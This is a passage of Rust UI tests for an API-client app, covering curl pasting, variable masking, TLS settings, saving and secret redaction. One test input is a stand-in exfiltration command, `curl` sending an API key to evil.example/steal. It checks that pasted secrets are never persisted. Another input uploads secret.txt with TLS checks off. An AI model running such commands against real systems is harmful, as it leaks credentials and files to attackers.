        let mut cx = TestAppContext::single();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        let other_instance = ProjectStore::at(root.path());
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();
        let saved_url = "https://example.com/saved";
        let draft_url = "https://example.com/draft";
        let external_url = "https://example.com/external";

        let (project_id, request_id) = cx
            .update_window(window, |_, window, cx| {
                view.update(cx, |view, cx| {
                    let ids = (view.current().id.clone(), view.selected_id.clone().unwrap());
                    view.projects.push(store.create("Second project").unwrap());
                    view.url
                        .update(cx, |input, cx| input.replace_all(saved_url, window, cx));
                    ids
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(view.dirty);
                view.switch_project(1, window, cx);
            });
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert_eq!(view.active_project, 1);
                assert!(!view.dirty);
                view.switch_project(0, window, cx);
                view.url
                    .update(cx, |input, cx| input.replace_all(draft_url, window, cx));
            });
        })
        .unwrap();

        let mut external = other_instance.load(&project_id).unwrap();
        assert_eq!(external.find_request(&request_id).unwrap().url, saved_url);
        external.find_request_mut(&request_id).unwrap().url = external_url.into();
        other_instance.save(&external).unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(view.dirty);
                view.switch_project(1, window, cx);
            });
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, _, cx| {
            let view = view.read(cx);
            assert_eq!(view.active_project, 0);
            assert_eq!(view.selected_id.as_deref(), Some(request_id.as_str()));
            assert_eq!(view.url.read(cx).value().as_ref(), draft_url);
            assert!(view.dirty);
            assert!(view.status_is_error);
            assert!(view.status.contains("modified on disk"));
        })
        .unwrap();
        let disk = other_instance.load(&project_id).unwrap();
        assert_eq!(disk.find_request(&request_id).unwrap().url, external_url);
    }

    #[test]
    fn pasting_curl_into_url_bar_populates_editor() {
        run_view_test(check_url_curl_paste);
    }

    fn check_url_curl_paste() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.url.update(cx, |input, cx| {
                    input.replace_all(
                        r#"curl -X POST "https://api.example.com/v1/orders?dry=1" -H "Authorization: Bearer tok_123" -H "X-Trace: abc" -d '{"item":"book"}'"#,
                        window,
                        cx,
                    );
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert_eq!(v.method, "POST");
            assert_eq!(
                v.url.read(cx).value().as_ref(),
                "https://api.example.com/v1/orders"
            );
            assert_eq!(v.auth_kind, super::AuthKind::Bearer);
            assert_eq!(v.auth_token.read(cx).value().as_ref(), "tok_123");
            assert_eq!(v.body_kind, super::BodyKind::Json);
            assert_eq!(
                v.body_editor.read(cx).value().as_ref(),
                r#"{"item":"book"}"#
            );
            assert_eq!(v.params_active_count, 1);
            assert_eq!(v.headers_active_count, 1);
            assert!(v.dirty);
        })
        .unwrap();
    }

    #[test]
    fn template_inspection_tracks_missing_vars_and_masks_secrets() {
        run_view_test(check_template_inspection);
    }

    fn check_template_inspection() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        let mut project = store.create("Vars project").unwrap();
        project
            .variables
            .insert("host".into(), "https://api.example.com".into());
        project
            .variables
            .insert("api_token".into(), "secret_xyz".into());
        let mut req = ApiRequest::new(
            "GET",
            "Users",
            "{{host}}/users?token={{api_token}}&env={{missing_env}}",
        );
        req.headers
            .push(fastman_core::KeyValue::new("X-Tenant", "{{tenant_id}}"));
        project.collections[0].requests.push(req);
        store.save(&project).unwrap();

        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert!(v.template_inspection.url_has_templates);
            assert_eq!(v.template_inspection.url_resolved_count, 2);
            assert_eq!(
                v.template_inspection.url_preview,
                "https://api.example.com/users?token=••••&env={{missing_env}}"
            );
            assert_eq!(
                v.template_inspection.missing_variables,
                vec!["missing_env".to_string(), "tenant_id".to_string()]
            );
            let url_tokens: Vec<String> = v
                .url
                .read(cx)
                .tokens()
                .iter()
                .map(|span| span.token().text().to_string())
                .collect();
            assert_eq!(url_tokens, vec!["{{host}}", "{{api_token}}"]);
        })
        .unwrap();
    }

    #[test]
    fn curl_paste_with_credentials_stages_outside_draft_and_cancel_then_save_preserves_prior_request()
     {
        run_view_test(check_curl_paste_cancel_then_save);
    }

    fn check_curl_paste_cancel_then_save() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        let mut project = store.create("Original Project").unwrap();
        let mut original = ApiRequest::new("POST", "Save Me", "https://example.com/original");
        original
            .headers
            .push(fastman_core::KeyValue::new("X-Keep", "1"));
        original.body = fastman_core::HttpBody::Json(r#"{"keep":true}"#.into());
        original.timeout_ms = 5_000;
        let project_id = project.id.clone();
        let request_id = original.id.clone();
        project.collections[0].requests.push(original);
        store.save(&project).unwrap();

        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.url.update(cx, |input, cx| {
                    input.replace_all(
                        r#"curl -H "X-Api-Key: secret-canary" https://evil.example/steal"#,
                        window,
                        cx,
                    );
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, _, cx| {
            view.update(cx, |view, cx| {
                assert_eq!(
                    view.url.read(cx).value().as_ref(),
                    "https://example.com/original"
                );
                assert!(!view.dirty);
                assert_eq!(view.method, "POST");
                assert_eq!(view.body_kind, super::BodyKind::Json);
                assert_eq!(view.headers_active_count, 1);
                let confirm = view
                    .active_curl_confirm
                    .as_ref()
                    .and_then(|w| w.upgrade())
                    .expect("confirmation dialog should be staged");
                assert_eq!(confirm.read(cx).findings_count, 1);
                assert!(confirm.read(cx).replace_summary.is_some());

                // Saving without confirming (e.g. after Cancel) must never persist pasted secrets.
                assert!(view.save(None, cx));
            });
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        let disk_json =
            std::fs::read_to_string(root.path().join(&project_id).join("project.json")).unwrap();
        assert!(!disk_json.contains("secret-canary"));
        assert!(!disk_json.contains("evil.example"));
        let disk_project = store.load(&project_id).unwrap();
        let disk_req = disk_project.find_request(&request_id).unwrap();
        assert_eq!(disk_req.url, "https://example.com/original");
        assert_eq!(disk_req.method, "POST");
    }

    #[test]
    fn curl_paste_on_dirty_draft_requires_confirmation_and_preserves_edits_until_confirmed() {
        run_view_test(check_curl_paste_on_dirty_draft);
    }

    fn check_curl_paste_on_dirty_draft() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.body_kind = super::BodyKind::Json;
                view.body_editor
                    .update(cx, |ed, cx| ed.set_value(r#"{"draft":1}"#, window, cx));
                view.append_header_preset("X-Draft", "yes", window, cx);
                view.timeout
                    .update(cx, |t, cx| t.replace_all("4500", window, cx));
                assert!(view.dirty);

                // Pasting a plain GET cURL command must not wipe unsaved edits silently.
                view.url.update(cx, |input, cx| {
                    input.replace_all("curl https://example.com/plain", window, cx);
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert_eq!(view.url.read(cx).value().as_ref(), "");
                assert!(view.dirty);
                assert_eq!(view.body_kind, super::BodyKind::Json);
                assert_eq!(view.body_editor.read(cx).value().as_ref(), r#"{"draft":1}"#);
                assert_eq!(view.headers_active_count, 1);
                assert_eq!(view.timeout.read(cx).value().as_ref(), "4500");

                let confirm = view
                    .active_curl_confirm
                    .as_ref()
                    .and_then(|w| w.upgrade())
                    .expect("replacement confirmation dialog should open");
                assert!(confirm.read(cx).replace_summary.is_some());

                // Explicitly confirming replacement updates the draft.
                view.apply_confirmed_curl_view(&confirm, window, cx);
                assert_eq!(
                    view.url.read(cx).value().as_ref(),
                    "https://example.com/plain"
                );
                assert_eq!(view.body_kind, super::BodyKind::None);
                assert_eq!(view.headers_active_count, 0);
                assert_eq!(view.timeout.read(cx).value().as_ref(), "30000");
            });
        })
        .unwrap();
    }

    #[test]
    fn curl_paste_with_unsupported_flags_prompts_before_applying() {
        run_view_test(check_curl_paste_unsupported_flags);
    }

    fn check_curl_paste_unsupported_flags() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.url.update(cx, |input, cx| {
                    input.replace_all(
                        "curl --form file=@secret.txt -k https://example.com/upload",
                        window,
                        cx,
                    );
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert_eq!(v.url.read(cx).value().as_ref(), "");
            assert!(!v.dirty);
            let confirm = v
                .active_curl_confirm
                .as_ref()
                .and_then(|w| w.upgrade())
                .expect("unsupported flags should trigger confirmation before applying");
            assert_eq!(
                confirm.read(cx).report.unsupported_flags,
                vec!["--form".to_string(), "-k".to_string()]
            );
        })
        .unwrap();
    }

    #[test]
    fn response_position_defaults_to_right_and_persists_across_reloads() {
        run_view_test(check_response_position_and_settings_dialog);
    }

    fn check_response_position_and_settings_dialog() {
        use crate::response_view::ResponsePosition;
        use gpui_kit::component::WindowExt as _;

        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert_eq!(view.response_position, ResponsePosition::Right);
                assert!(!window.has_active_dialog(cx));

                view.open_response_settings_dialog(window, cx);
                assert!(window.has_active_dialog(cx));
                window.close_dialog(cx);

                view.set_response_position(ResponsePosition::Left, cx);
                assert_eq!(view.response_position, ResponsePosition::Left);

                view.toggle_response_wrap(cx);
                assert!(view.response_wrap);

                view.toggle_response_raw(cx);
                assert!(view.response_raw);

                view.set_response_position(ResponsePosition::Bottom, cx);
                assert_eq!(view.response_position, ResponsePosition::Bottom);
            });
        })
        .unwrap();

        // Reload in a fresh view against the same store root and verify persisted UI settings.
        let (window2, view2) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window2, |_, _, cx| {
            let v = view2.read(cx);
            assert_eq!(v.response_position, ResponsePosition::Bottom);
            assert!(v.response_wrap);
            assert!(v.response_raw);
        })
        .unwrap();
    }

    #[test]
    fn command_palette_toggles_filters_and_executes_targets() {
        run_view_test(check_command_palette_flow);
    }

    fn check_command_palette_flow() {
        use crate::command_palette::{
            PaletteAction, PaletteSection, PaletteTarget, execute_palette_target, filter_catalog,
        };
        use crate::response_view::ResponsePosition;
        use gpui_kit::component::WindowExt as _;

        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());

        let mut proj1 = store.create("Payments API").unwrap();
        let mut parent = Folder::new("Billing");
        let mut child = Folder::new("Invoices");
        let child_id = child.id.clone();
        let parent_id = parent.id.clone();
        let invoice_req =
            ApiRequest::new("POST", "Create Invoice", "https://api.example/v1/invoices");
        let invoice_req_id = invoice_req.id.clone();
        child.requests.push(invoice_req);
        parent.folders.push(child);
        proj1.collections[0].folders.push(parent);
        let health_req = ApiRequest::new("GET", "Health Check", "https://api.example/health");
        proj1.collections[0].requests.push(health_req);
        store.save(&proj1).unwrap();

        let proj2 = store.create("Auth Service").unwrap();
        store.save(&proj2).unwrap();

        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            let weak_view = view.downgrade();
            view.update(cx, |view, cx| {
                let payments_ix = view
                    .projects
                    .iter()
                    .position(|p| p.name == "Payments API")
                    .expect("Payments API project");
                view.switch_project(payments_ix, window, cx);

                assert!(!window.has_active_dialog(cx));
                view.open_command_palette(window, cx);
                assert!(window.has_active_dialog(cx));

                let palette = view
                    .active_command_palette
                    .as_ref()
                    .and_then(|w| w.upgrade())
                    .expect("palette view entity");
                {
                    let catalog = &palette.read(cx).catalog;
                    let groups = filter_catalog(catalog, "post invo");
                    assert_eq!(groups[0].0, PaletteSection::Requests);
                    assert_eq!(groups[0].1[0].title, "Create Invoice");

                    let folder_groups = filter_catalog(catalog, "Invoices");
                    assert!(
                        folder_groups
                            .iter()
                            .any(|(sec, entries)| *sec == PaletteSection::Folders
                                && entries.iter().any(|e| e.title == "Invoices"))
                    );
                }

                // Calling open_command_palette again toggles the palette closed.
                view.open_command_palette(window, cx);
                assert!(!window.has_active_dialog(cx));
                assert!(view.active_command_palette.is_none());
            });

            // Execute Request navigation target.
            execute_palette_target(
                PaletteTarget::Request {
                    id: invoice_req_id.clone(),
                },
                &weak_view,
                window,
                cx,
            );
            view.update(cx, |view, _| {
                assert_eq!(view.selected_id.as_deref(), Some(invoice_req_id.as_str()));
                assert!(view.open_tabs.contains(&invoice_req_id));
                view.expanded.clear();
            });

            // Execute nested Folder target: expands ancestor & folder and focuses it.
            execute_palette_target(
                PaletteTarget::Folder {
                    id: child_id.clone(),
                    ancestor_ids: vec![parent_id.clone()],
                },
                &weak_view,
                window,
                cx,
            );
            view.update(cx, |view, _| {
                assert!(view.expanded.contains(&parent_id));
                assert!(view.expanded.contains(&child_id));
                assert_eq!(view.target_folder.as_deref(), Some(child_id.as_str()));
            });

            // Execute CycleResponsePosition action.
            execute_palette_target(
                PaletteTarget::Action(PaletteAction::CycleResponsePosition),
                &weak_view,
                window,
                cx,
            );
            assert_eq!(view.read(cx).response_position, ResponsePosition::Bottom);

            // Execute Project switch and check project_selector sync.
            let target_proj_idx = view
                .read(cx)
                .projects
                .iter()
                .position(|p| p.name == "Auth Service")
                .expect("Auth Service project");
            execute_palette_target(
                PaletteTarget::Project {
                    index: target_proj_idx,
                },
                &weak_view,
                window,
                cx,
            );
            let v = view.read(cx);
            assert_eq!(v.active_project, target_proj_idx);
            assert_eq!(
                v.project_selector
                    .read(cx)
                    .selected_index(cx)
                    .map(|p| p.row),
                Some(target_proj_idx)
            );
        })
        .unwrap();
    }

    #[test]
    fn verify_tls_defaults_true_and_persists_through_draft_and_reload() {
        run_view_test(check_verify_tls_persistence);
    }

    fn check_verify_tls_persistence() {
        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        let (project_id, request_id) = cx
            .update_window(window, |_, _, cx| {
                view.update(cx, |view, cx| {
                    assert!(view.verify_tls);
                    assert!(!view.dirty);

                    view.toggle_verify_tls(cx);
                    assert!(!view.verify_tls);
                    assert!(view.dirty);
                    assert!(!view.snapshot_draft_request(cx).verify_tls);

                    assert!(view.save(None, cx));
                    assert!(view.dirty);

                    let project_id = view.current().id.clone();
                    let request_id = view.selected_id.clone().unwrap();
                    (project_id, request_id)
                })
            })
            .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, _, cx| {
            assert!(!view.read(cx).dirty);
        })
        .unwrap();

        let disk_project = store.load(&project_id).unwrap();
        assert!(!disk_project.find_request(&request_id).unwrap().verify_tls);

        let (window2, view2) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window2, |_, window, cx| {
            view2.update(cx, |view, cx| {
                assert!(!view.verify_tls);
                view.url.update(cx, |input, cx| {
                    input.replace_all("curl -k https://example.com/secure", window, cx);
                });
            });
        })
        .unwrap();

        cx.update_window(window2, |_, _, cx| {
            let v = view2.read(cx);
            let confirm = v
                .active_curl_confirm
                .as_ref()
                .and_then(|w| w.upgrade())
                .expect("curl -k should stage confirmation");
            assert_eq!(confirm.read(cx).report.unsupported_flags, vec!["-k"]);
            assert!(confirm.read(cx).report.request.verify_tls);
        })
        .unwrap();
    }

    #[test]
    fn extract_url_query_params_decodes_and_preserves_fragment() {
        run_view_test(check_extract_url_query_params);
    }

    fn check_extract_url_query_params() {
        use fastman_core::model::KeyValue;

        let mut cx = TestAppContext::single();
        let root = tempfile::tempdir().unwrap();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                let target_url = "https://api.example.com/search?q=hello%20world&expr=a%2Bb&tag=a&tag=b&empty=&flag&tpl={{var}}&uni=caf%C3%A9#top";
                view.url
                    .update(cx, |input, cx| input.replace_all(target_url, window, cx));
                view.extract_url_query_params(window, cx);

                assert_eq!(
                    view.url.read(cx).value().as_ref(),
                    "https://api.example.com/search#top"
                );
                assert_eq!(
                    view.params_table.to_key_values(cx),
                    vec![
                        KeyValue::new("q", "hello world"),
                        KeyValue::new("expr", "a+b"),
                        KeyValue::new("tag", "a"),
                        KeyValue::new("tag", "b"),
                        KeyValue::new("empty", ""),
                        KeyValue::new("flag", ""),
                        KeyValue::new("tpl", "{{var}}"),
                        KeyValue::new("uni", "café"),
                    ]
                );

                let frag_only = "https://api.example.com/page#sec?not=query";
                view.url
                    .update(cx, |input, cx| input.replace_all(frag_only, window, cx));
                view.extract_url_query_params(window, cx);
                assert_eq!(view.url.read(cx).value().as_ref(), frag_only);
                assert_eq!(view.params_table.to_key_values(cx).len(), 8);
            });
        })
        .unwrap();
    }

    #[test]
    fn async_save_does_not_clear_dirty_for_stale_revision_and_preserves_order() {
        run_view_test(check_async_save_revision_ordering);
    }

    fn check_async_save_revision_ordering() {
        let root = tempfile::tempdir().unwrap();
        let mut cx = TestAppContext::single();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        let (project_id, request_id) = cx
            .update_window(window, |_, window, cx| {
                view.update(cx, |view, cx| {
                    view.persistence
                        .set_simulated_delay(std::time::Duration::from_millis(60));
                    view.url.update(cx, |input, cx| {
                        input.replace_all("https://example.com/rev1", window, cx);
                    });
                    (view.current().id.clone(), view.selected_id.clone().unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(view.dirty);
                assert!(view.save(Some(window), cx));

                // Edit revision 2 while revision 1 is in flight on the background worker.
                view.url.update(cx, |input, cx| {
                    input.replace_all("https://example.com/rev2", window, cx);
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, _, cx| {
            assert!(view.read(cx).dirty);
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        // Revision 1 finished, but revision 2 has not been saved yet, so dirty must remain true.
        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(view.dirty);
                assert!(view.save(Some(window), cx));

                // Edit revision 3 before rev2 commits to verify monotonic ordering.
                view.url.update(cx, |input, cx| {
                    input.replace_all("https://example.com/rev3", window, cx);
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(view.save(Some(window), cx));
            });
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert!(!v.dirty);
            assert!(!v.status_is_error);
        })
        .unwrap();

        let disk = store.load(&project_id).unwrap();
        assert_eq!(
            disk.find_request(&request_id).unwrap().url,
            "https://example.com/rev3"
        );
    }

    #[test]
    fn async_save_failure_keeps_dirty_blocks_switches_and_recovers_on_retry() {
        run_view_test(check_async_save_failure_and_retry);
    }

    fn check_async_save_failure_and_retry() {
        let root = tempfile::tempdir().unwrap();
        let mut cx = TestAppContext::single();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        let (project_id, request_id, second_req_id) = cx
            .update_window(window, |_, window, cx| {
                view.update(cx, |view, cx| {
                    let second = ApiRequest::new("GET", "Second", "https://example.com/second");
                    let second_id = second.id.clone();
                    view.projects[0].collections[0].requests.push(second);
                    view.projects.push(store.create("Other").unwrap());
                    let project_id = view.current().id.clone();
                    let request_id = view.selected_id.clone().unwrap();
                    view.url.update(cx, |input, cx| {
                        input.replace_all("https://example.com/initial", window, cx);
                    });
                    (project_id, request_id, second_id)
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(view.save(Some(window), cx));
            });
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        // Simulate an external save conflict, then edit and attempt tab + project switches.
        let external = ProjectStore::at(root.path());
        let mut ext_proj = external.load(&project_id).unwrap();
        ext_proj.name = "External Edit".into();
        external.save(&ext_proj).unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.url.update(cx, |input, cx| {
                    input.replace_all("https://example.com/local-retry", window, cx);
                });
            });
        })
        .unwrap();

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.save_with_toast(window, cx);
            });
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(view.dirty);
                assert!(view.status_is_error);
                assert!(view.status.contains("modified on disk"));

                view.open_request(second_req_id.clone(), window, cx);
            });
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert_eq!(view.selected_id.as_deref(), Some(request_id.as_str()));
                assert!(view.dirty);
                assert!(view.status.contains("Cannot switch tab"));

                // Refresh store hash after user inspects/resolves conflict and retry save.
                let latest = store.load(&project_id).unwrap();
                assert_eq!(latest.name, "External Edit");
                view.projects[0].name = "Merged Name".into();
                view.switch_project(1, window, cx);
            });
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert_eq!(v.active_project, 1);
            assert!(!v.dirty);
            assert!(!v.status_is_error);
        })
        .unwrap();

        let saved = store.load(&project_id).unwrap();
        assert_eq!(saved.name, "Merged Name");
        assert_eq!(
            saved.find_request(&request_id).unwrap().url,
            "https://example.com/local-retry"
        );
    }

    #[test]
    fn environments_override_base_variables_persist_across_reload_and_switch_via_palette() {
        run_view_test(check_environments_override_and_palette_switch);
    }

    fn check_environments_override_and_palette_switch() {
        let root = tempfile::tempdir().unwrap();
        let mut cx = TestAppContext::single();
        let store = ProjectStore::at(root.path());

        let mut project = store.create("Env Project").unwrap();
        project
            .variables
            .insert("base_url".into(), "https://base.example".into());

        let mut local_env = fastman_core::model::Environment::new("local");
        local_env
            .variables
            .insert("base_url".into(), "https://local.example".into());
        let local_id = local_env.id.clone();

        let mut prod_env = fastman_core::model::Environment::new("prod");
        prod_env
            .variables
            .insert("base_url".into(), "https://prod.example".into());
        let prod_id = prod_env.id.clone();

        project.environments = vec![local_env, prod_env];
        project.active_environment = Some(local_id);
        project.collections[0]
            .requests
            .push(ApiRequest::new("GET", "Items", "{{base_url}}/items"));
        let project_id = project.id.clone();
        store.save(&project).unwrap();

        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        cx.update_window(window, |_, window, cx| {
            assert_eq!(
                view.read(cx).template_inspection.url_preview,
                "https://local.example/items"
            );
            let entries = crate::command_palette::build_catalog(view.read(cx));
            assert!(entries.iter().any(|entry| {
                entry.section == crate::command_palette::PaletteSection::Environments
                    && entry.target
                        == crate::command_palette::PaletteTarget::Environment {
                            id: Some(prod_id.clone()),
                        }
            }));

            let weak = view.downgrade();
            crate::command_palette::execute_palette_target(
                crate::command_palette::PaletteTarget::Environment {
                    id: Some(prod_id.clone()),
                },
                &weak,
                window,
                cx,
            );
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert!(!v.dirty);
            assert_eq!(
                v.current().active_environment.as_deref(),
                Some(prod_id.as_str())
            );
            assert_eq!(
                v.template_inspection.url_preview,
                "https://prod.example/items"
            );
        })
        .unwrap();

        let reloaded = store.load(&project_id).unwrap();
        assert_eq!(
            reloaded.active_environment.as_deref(),
            Some(prod_id.as_str())
        );
    }

    #[test]
    fn secret_variables_mask_in_preview_redact_in_curl_and_never_persist_plaintext() {
        run_view_test(check_secret_variables_masking_and_redaction);
    }

    fn check_secret_variables_masking_and_redaction() {
        let root = tempfile::tempdir().unwrap();
        let mut cx = TestAppContext::single();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        let secret_store = std::sync::Arc::new(MemorySecretStore::new());

        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| {
                        WorkspaceView::with_store_and_secrets(
                            store.clone(),
                            secret_store.clone(),
                            window,
                            cx,
                        )
                        .unwrap()
                    })
                })
            })
            .unwrap();

        let (project_id, key_ref) = cx
            .update_window(window, |_, window, cx| {
                let proj = view.read(cx).current().clone();
                let project_id = proj.id.clone();
                let sheet =
                    cx.new(|cx| VariablesSheetView::new(&proj, &Default::default(), window, cx));
                assert!(sheet.read(cx).build_submission(cx).is_ok());

                let key_ref = fastman_core::secrets::make_keychain_key(&project_id, "base");
                let mut secret_variables = std::collections::BTreeMap::new();
                secret_variables.insert(
                    "custom_x".to_owned(),
                    fastman_core::model::SecretRef::Keychain {
                        key: key_ref.clone(),
                    },
                );
                let mut secret_plan = fastman_core::secrets::SecretChangePlan::default();
                secret_plan
                    .writes
                    .push((key_ref.clone(), "canary_keychain_value_999".to_owned()));
                let submission = VariablesSubmission {
                    variables: std::collections::BTreeMap::new(),
                    secret_variables,
                    environments: Vec::new(),
                    active_environment: None,
                    secret_plan,
                };
                view.update(cx, |view, cx| {
                    view.save_variables_and_environments(submission, sheet, window, cx);
                });
                (project_id, key_ref)
            })
            .unwrap();

        drain_persistence(&mut cx, &view);

        assert_eq!(
            secret_store.get(&key_ref).unwrap().as_deref(),
            Some("canary_keychain_value_999")
        );
        let disk_json =
            std::fs::read_to_string(root.path().join(&project_id).join("project.json")).unwrap();
        assert!(!disk_json.contains("canary_keychain_value_999"));
        assert!(disk_json.contains("custom_x"));
        assert!(disk_json.contains("keychain"));

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(!view.dirty);
                view.url.update(cx, |input, cx| {
                    input.replace_all("https://api.example/v1?x={{custom_x}}", window, cx);
                });
                view.append_header_preset(
                    "Authorization",
                    "Bearer raw_canary_token_123",
                    window,
                    cx,
                );
            });
        })
        .unwrap();

        cx.update_window(window, |_, window, cx| {
            let v = view.read(cx);
            assert_eq!(
                v.template_inspection.url_preview,
                "https://api.example/v1?x=••••"
            );
            assert!(!v.draft_sensitive_findings.is_empty());

            let req = v.snapshot_draft_request(cx);
            let redacted = curl::to_curl_export_with_secrets(
                &req,
                &v.resolved_variables.values,
                &v.resolved_variables.secret_names,
                true,
